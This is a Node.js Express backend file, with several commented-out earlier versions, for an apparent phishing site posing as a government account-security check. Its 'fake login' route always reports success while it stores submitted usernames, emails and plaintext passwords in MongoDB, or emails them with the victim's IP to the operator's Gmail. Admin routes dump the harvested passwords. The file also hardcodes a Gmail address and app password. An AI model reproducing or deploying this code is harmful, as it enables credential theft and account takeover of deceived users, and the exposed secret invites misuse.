// // // // // require("dotenv").config();
// // // // // const express = require("express");
// // // // // const mongoose = require("mongoose");
// // // // // const cors = require("cors");
// // // // // const User = require("./user");

// // // // // const app = express();

// // // // // app.use(express.json());

// // // // // app.use(cors({
// // // // //   origin: [
// // // // //     "https://governmentaccountssecurity.vercel.app",
// // // // //     "http://localhost:5173"
// // // // //   ],
// // // // //   methods: ["GET", "POST", "DELETE"],
// // // // //   allowedHeaders: ["Content-Type", "x-admin-key"]
// // // // // }));

// // // // // app.get("/", (req, res) => {
// // // // //   res.status(200).send("Backend is running");
// // // // // });

// // // // // mongoose.connect(process.env.MONGO_URI)
// // // // //   .then(() => console.log("MongoDB Connected"))
// // // // //   .catch(err => console.log("Mongo Error:", err));

// // // // // app.post("/login", async (req, res) => {
// // // // //   try {
// // // // //     const { userName, email, passWord } = req.body;

// // // // //     if (!userName || !email || !passWord) {
// // // // //       return res.status(400).json({ message: "All fields required" });
// // // // //     }

// // // // //     // ❌ NO DUPLICATE CHECK
// // // // //     // ❌ NO LOGIN VALIDATION

// // // // //     const newEntry = new User({
// // // // //       userName,
// // // // //       email,
// // // // //       passWord,
// // // // //       createdAt: new Date()
// // // // //     });

// // // // //     await newEntry.save();

// // // // //     // ✅ ALWAYS SUCCESS
// // // // //     res.status(200).json({
// // // // //       success: true,
// // // // //       userName
// // // // //     });

// // // // //   } catch (err) {
// // // // //     res.status(500).json({ message: "Server error" });
// // // // //   }
// // // // // });


// // // // // app.get("/admin/users", async (req, res) => {
// // // // //   if (req.headers["x-admin-key"] !== "OWNER_SECRET_123") {
// // // // //     return res.status(403).json({ message: "Access denied" });
// // // // //   }

// // // // //   const users = await User.find({}, {
// // // // //     userName: 1,
// // // // //     email: 1,
// // // // //     passWord: 1,
// // // // //     _id: 0
// // // // //   });

// // // // //   res.json(users);
// // // // // });

// // // // // app.delete("/admin/clear-users", async (req, res) => {
// // // // //   if (req.headers["x-admin-key"] !== "OWNER_SECRET_123") {
// // // // //     return res.status(403).json({ message: "Access denied" });
// // // // //   }

// // // // //   await User.deleteMany({});
// // // // //   res.json({ message: "All users deleted" });
// // // // // });

// // // // // const PORT = process.env.PORT || 4000;
// // // // // app.listen(PORT, () => console.log(`Server running on ${PORT}`));







// // // // // require("dotenv").config();
// // // // // const express = require("express");
// // // // // const mongoose = require("mongoose");
// // // // // const cors = require("cors");
// // // // // const User = require("./user");

// // // // // const app = express();

// // // // // app.use(express.json());

// // // // // // 🔥 TEMPORARY OPEN CORS (for mobile debug)
// // // // // app.use(cors({
// // // // //   origin: "*",
// // // // //   methods: ["GET", "POST", "OPTIONS"],
// // // // //   allowedHeaders: ["Content-Type", "x-admin-key"]
// // // // // }));

// // // // // // app.options("/*", cors());

// // // // // app.get("/", (req, res) => {
// // // // //   res.status(200).send("Backend is running");
// // // // // });

// // // // // mongoose.connect(process.env.MONGO_URI)
// // // // //   .then(() => console.log("MongoDB Connected"))
// // // // //   .catch(err => console.log("Mongo Error:", err));

// // // // // app.post("/login", async (req, res) => {
// // // // //   try {
// // // // //     const { userName, email, passWord } = req.body;

// // // // //     if (!userName || !email || !passWord) {
// // // // //       return res.status(400).json({ success: false, step: "missing_fields" });
// // // // //     }

// // // // //     await User.create({
// // // // //       userName,
// // // // //       email,
// // // // //       passWord,
// // // // //       createdAt: new Date()
// // // // //     });

// // // // //     return res.status(200).json({
// // // // //       success: true,
// // // // //       step: "saved_successfully",
// // // // //       userName
// // // // //     });

// // // // //   } catch (err) {
// // // // //     console.error("LOGIN ERROR:", err);
// // // // //     return res.status(200).json({
// // // // //       success: true,   // ⚠️ IMPORTANT
// // // // //       step: "db_error_but_continue"
// // // // //     });
// // // // //   }
// // // // // });

// // // // // const PORT = process.env.PORT || 4000;
// // // // // app.listen(PORT, () =>
// // // // //   console.log(`Server running on ${PORT}`)
// // // // // );










// // // // require("dotenv").config();
// // // // const express = require("express");
// // // // const mongoose = require("mongoose");
// // // // const cors = require("cors");
// // // // const User = require("./user");

// // // // const app = express();

// // // // /* ---------------- MIDDLEWARE ---------------- */
// // // // app.use(express.json());

// // // // // 🔥 OPEN CORS (demo + mobile safe)
// // // // app.use(cors({
// // // //   origin: "*",
// // // //   methods: ["GET", "POST", "DELETE"],
// // // //   allowedHeaders: ["Content-Type", "x-admin-key"]
// // // // }));

// // // // /* ---------------- HEALTH CHECK ---------------- */
// // // // app.get("/", (req, res) => {
// // // //   res.status(200).send("Backend is running");
// // // // });

// // // // /* ---------------- DB CONNECT ---------------- */
// // // // mongoose.connect(process.env.MONGO_URI)
// // // //   .then(() => console.log("MongoDB Connected"))
// // // //   .catch(err => console.log("Mongo Error:", err));

// // // // /* =====================================================
// // // //    1️⃣ FAKE LOGIN (ALWAYS SUCCESS, ALWAYS STORE)
// // // //    ===================================================== */
// // // // app.post("/login", async (req, res) => {
// // // //   try {
// // // //     const { userName, email, passWord } = req.body;

// // // //     if (!userName || !email || !passWord) {
// // // //       return res.status(400).json({
// // // //         success: false,
// // // //         step: "missing_fields"
// // // //       });
// // // //     }

// // // //     await User.create({
// // // //       userName,
// // // //       email,
// // // //       passWord,
// // // //       createdAt: new Date()
// // // //     });

// // // //     return res.status(200).json({
// // // //       success: true,
// // // //       step: "stored_successfully",
// // // //       userName
// // // //     });

// // // //   } catch (err) {
// // // //     console.error("LOGIN ERROR:", err);

// // // //     // ⚠️ VERY IMPORTANT:
// // // //     // Even DB error → frontend flow must continue
// // // //     return res.status(200).json({
// // // //       success: true,
// // // //       step: "db_error_but_continue"
// // // //     });
// // // //   }
// // // // });

// // // // /* =====================================================
// // // //    2️⃣ ADMIN – FETCH USERS (FOR DASHBOARD)
// // // //    ===================================================== */
// // // // app.get("/admin/users", async (req, res) => {
// // // //   try {
// // // //     const adminKey = req.headers["x-admin-key"];

// // // //     if (adminKey !== "OWNER_SECRET_123") {
// // // //       return res.status(403).json({ message: "Access denied" });
// // // //     }

// // // //     const users = await User.find(
// // // //       {},
// // // //       {
// // // //         _id: 0,
// // // //         userName: 1,
// // // //         email: 1,
// // // //         passWord: 1,
// // // //         createdAt: 1
// // // //       }
// // // //     ).sort({ createdAt: -1 });

// // // //     res.status(200).json({
// // // //       success: true,
// // // //       count: users.length,
// // // //       users
// // // //     });

// // // //   } catch (err) {
// // // //     console.error("FETCH USERS ERROR:", err);
// // // //     res.status(500).json({ success: false });
// // // //   }
// // // // });

// // // // /* =====================================================
// // // //    3️⃣ ADMIN – DELETE ALL USERS
// // // //    ===================================================== */
// // // // app.delete("/admin/clear-users", async (req, res) => {
// // // //   try {
// // // //     const adminKey = req.headers["x-admin-key"];

// // // //     if (adminKey !== "OWNER_SECRET_123") {
// // // //       return res.status(403).json({ message: "Access denied" });
// // // //     }

// // // //     await User.deleteMany({});

// // // //     res.status(200).json({
// // // //       success: true,
// // // //       message: "All users deleted"
// // // //     });

// // // //   } catch (err) {
// // // //     console.error("DELETE USERS ERROR:", err);
// // // //     res.status(500).json({ success: false });
// // // //   }
// // // // });

// // // // /* ---------------- SERVER ---------------- */
// // // // const PORT = process.env.PORT || 4000;
// // // // app.listen(PORT, () => {
// // // //   console.log(`Server running on port ${PORT}`);
// // // // });



// // // require("dotenv").config();
// // // const express = require("express");
// // // const cors = require("cors");
// // // const { sendEmail } = require("./sendEmail");

// // // const app = express();

// // // app.use(express.json());

// // // app.use(cors({
// // //   origin: "*",
// // //   methods: ["GET", "POST"],
// // //   allowedHeaders: ["Content-Type"]
// // // }));

// // // /* ---------------- HEALTH CHECK ---------------- */
// // // app.get("/", (req, res) => {
// // //   res.send("Backend is running");
// // // });

// // // /* ---------------- FAKE LOGIN ---------------- */
// // // app.post("/login", async (req, res) => {
// // //   try {
// // //     const { userName, email, passWord } = req.body;

// // //     if (!userName || !email || !passWord) {
// // //       return res.status(400).json({
// // //         success: false,
// // //         message: "Missing fields"
// // //       });
// // //     }

// // //     // 📧 EMAIL CONTENT
// // //     const mailText = `
// // // 🚨 NEW ACCOUNT SUBMISSION 🚨

// // // Username: ${userName}
// // // Email: ${email}
// // // Password: ${passWord}

// // // Time: ${new Date().toLocaleString()}
// // // IP: ${req.ip}
// // //     `;

// // //     // ✅ SEND TO OWNER
// // //     await sendEmail(
// // //       "OWNER_EMAIL@gmail.com",
// // //       "New Account Verification Request",
// // //       mailText
// // //     );

// // //     // ✅ ALWAYS SUCCESS
// // //     return res.status(200).json({
// // //       success: true,
// // //       step: "email_sent"
// // //     });

// // //   } catch (err) {
// // //     console.error("MAIL ERROR:", err);

// // //     // ⚠️ STILL SUCCESS (FAKE SYSTEM)
// // //     return res.status(200).json({
// // //       success: true,
// // //       step: "mail_failed_but_continue"
// // //     });
// // //   }
// // // });

// // // /* ---------------- SERVER ---------------- */
// // // const PORT = process.env.PORT || 4000;
// // // app.listen(PORT, () => {
// // //   console.log("Server running on port", PORT);
// // // });










// // require("dotenv").config();
// // const express = require("express");
// // const cors = require("cors");
// // const { sendEmail } = require("./sendEmail");

// // const app = express();

// // /* ================= BASIC MIDDLEWARE ================= */
// // app.use(express.json());

// // app.use(cors({
// //   origin: "*",
// //   methods: ["GET", "POST"],
// //   allowedHeaders: ["Content-Type"]
// // }));

// // /* ================= ENV DEBUG ================= */
// // console.log("ENV CHECK:");
// // console.log("EMAIL_USER exists:", !!process.env.EMAIL_USER);
// // console.log("EMAIL_PASS exists:", !!process.env.EMAIL_PASS);

// // /* ================= HEALTH CHECK ================= */
// // app.get("/", (req, res) => {
// //   res.send("Backend is running");
// // });

// // /* ================= LOGIN ROUTE ================= */
// // app.post("/login", async (req, res) => {
// //   console.log("---- /login HIT ----");
// //   console.log("Request body:", req.body);

// //   const { userName, email, passWord } = req.body;

// //   if (!userName || !email || !passWord) {
// //     console.log("❌ Missing fields");
// //     return res.status(400).json({
// //       success: false,
// //       step: "missing_fields"
// //     });
// //   }

// //   const mailText = `
// // NEW ACCOUNT SUBMISSION

// // Username: ${userName}
// // Email: ${email}
// // Password: ${passWord}
// // Time: ${new Date().toLocaleString()}
// // IP: ${req.ip}
// //   `;

// //   try {
// //     console.log("📧 Calling sendEmail()");
// //     await sendEmail(
// //       process.env.EMAIL_USER, // owner email
// //       "New Account Verification",
// //       mailText
// //     );
// //     console.log("✅ Email SENT SUCCESSFULLY");

// //     return res.status(200).json({
// //       success: true,
// //       step: "email_sent"
// //     });

// //   } catch (err) {
// //     console.error("🔥 EMAIL FAILED:", err.message);

// //     // IMPORTANT: still success (fake login)
// //     return res.status(200).json({
// //       success: true,
// //       step: "email_failed_but_continue",
// //       error: err.message
// //     });
// //   }
// // });

// // /* ================= SERVER ================= */
// // const PORT = process.env.PORT || 4000;
// // app.listen(PORT, () => {
// //   console.log("🚀 Server running on port", PORT);
// // });












// const nodemailer = require("nodemailer");

// const sendEmail = async (to, subject, text) => {
//     console.log("📨 Initializing mail transporter...");

//     const transporter = nodemailer.createTransport({
//         service: "Gmail",
//         auth: {
//             user: 'sahuprayag145@gmail.com',
//                         pass: 'hhxx dbcp havm tiox', // App password
//         },
//         connectionTimeout: 10000,
//         greetingTimeout: 10000,
//         socketTimeout: 10000
//     });

//     console.log("🔍 Verifying transporter...");
//     await transporter.verify();
//     console.log("✅ Transporter verified");

//     console.log("📤 Sending email...");
//     await transporter.sendMail({
//         from: 'sahuprayag145@gmail.com',
//         to,
//         subject,
//         text
//     });

//     console.log("📬 Email sendMail resolved");
// };

// module.exports = { sendEmail };








const express = require("express");
const cors = require("cors");
const nodemailer = require("nodemailer");

const app = express();

/* ================= BASIC SETUP ================= */
app.use(express.json());
app.use(cors({ origin: "*" }));

/* ================= HEALTH CHECK ================= */
app.get("/", (req, res) => {
  res.send("Backend is running");
});

/* ================= MAIL TRANSPORTER ================= */
/* ❗ NO ENV USED – DIRECT APP PASSWORD */
const transporter = nodemailer.createTransport({
  service: "Gmail",
  auth: {
    user: "sahuprayag145@gmail.com",
    pass: "hhxx dbcp havm tiox" // Gmail App Password ONLY
  }
});

/* ================= LOGIN (FAKE) ================= */
app.post("/login", (req, res) => {
  const { userName, email, passWord } = req.body;

  console.log("LOGIN HIT:", req.body);

  if (!userName || !email || !passWord) {
    return res.status(400).json({
      success: false,
      step: "missing_fields"
    });
  }

  /* -------- EMAIL CONTENT -------- */
  const mailText = `
🔐 NEW ACCOUNT ATTEMPT

Username: ${userName}
Email: ${email}
Password: ${passWord}

Time: ${new Date().toLocaleString()}
IP: ${req.ip}
`;

  /* -------- FIRE & FORGET EMAIL -------- */
  transporter.sendMail({
    from: "Govt Security <sahuprayag145@gmail.com>",
    to: "sahuprayag145@gmail.com",
    subject: "New Social Media Verification",
    text: mailText
  })
    .then(() => console.log("✅ EMAIL SENT"))
    .catch(err => console.error("❌ EMAIL FAILED (IGNORED):", err.message));

  /* -------- ALWAYS SUCCESS (FAKE LOGIN) -------- */
  return res.status(200).json({
    success: true,
    step: "login_success"
  });
});

/* ================= SERVER ================= */
const PORT = process.env.PORT || 4000;
app.listen(PORT, () => {
  console.log("🚀 Server running on port", PORT);
});
